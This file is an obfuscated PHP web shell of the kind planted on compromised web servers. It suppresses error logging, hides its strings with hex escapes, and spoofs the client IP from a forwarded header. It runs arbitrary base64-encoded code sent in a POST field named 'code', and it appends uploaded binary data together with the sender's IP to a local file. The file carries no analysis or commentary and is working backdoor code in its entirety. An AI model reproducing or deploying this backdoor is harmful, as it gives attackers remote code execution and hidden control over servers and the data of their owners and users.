<?php @error_reporting(0); @ini_set("displa\x79_errors",0); @ini_set("l\x6fg\x5ferr\x6f\x72s",0); @ini_set("\x65rror_\x6cog",0); @ini_set("m\x65m\x6fr\x79_limit", "\x3128M"); @ini_set("\x6dax_\x65xe\x63ution_\x74i\x6de",30); @set_time_limit(30); if (isset($_SERVER["H\x54\x54\x50_X_\x52\x45\x41L_IP"])) $_SERVER["REMOTE\x5fAD\x44\x52"] = $_SERVER["H\x54\x54\x50_X_\x52\x45\x41L_IP"]; if (isset($_POST["\x63o\x64\x65"])) { eval(base64_decode($_POST["\x63o\x64\x65"])); } elseif (isset($_SERVER["HTTP_CON\x54ENT\x5fEN\x43\x4fD\x49N\x47"]) && $_SERVER["HTTP_CON\x54ENT\x5fEN\x43\x4fD\x49N\x47"] == "binar\x79") { $input = file_get_contents("php:/\x2f\x69np\x75t"); if (strlen($input) > 0) print "S\x54A\x54\x55\x53\x2dIMPO\x52\x54-OK"; if (strlen($input) > 10) { $fp = @fopen(str_replace(".p\x68\x70",".bin",basename($_SERVER["SCRIPT_FILENAM\x45"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["REMOTE\x5fAD\x44\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["RE\x51U\x45ST_URI"], "\x2eshtm\x6c") !== false) { print $_SERVER["RE\x51U\x45ST_URI"]; } exit; ?>